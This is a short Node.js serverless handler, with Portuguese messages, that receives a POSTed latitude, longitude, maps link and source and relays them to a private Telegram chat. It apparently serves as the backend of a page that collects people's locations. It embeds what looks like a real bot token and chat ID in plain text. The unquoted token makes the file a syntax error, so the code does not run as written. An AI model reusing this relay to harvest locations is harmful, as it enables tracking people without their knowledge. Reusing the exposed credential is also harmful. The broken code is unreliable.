const axios = require("axios");

module.exports = async (req, res) => {
  if (req.method !== "POST") {
    return res.status(405).json({ success: false, message: "Método não permitido" });
  }

  const { latitude, longitude, maps, source } = req.body;

  const TELEGRAM_BOT_TOKEN = 7964496822:AAFCBrNEI0b0oYQOFimCMobsWi_peVjN0wY;
  const TELEGRAM_CHAT_ID = 6045619916;

  const message = `📍 Localização recebida\nFonte: ${source}\nLatitude: ${latitude}\nLongitude: ${longitude}\nMaps: ${maps}`;

  try {
    await axios.post(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
      chat_id: TELEGRAM_CHAT_ID,
      text: message,
    });

    return res.status(200).json({ success: true });
  } catch (error) {
    console.error(error);
    return res.status(500).json({ success: false, message: "Erro ao enviar para o Telegram." });
  }
};
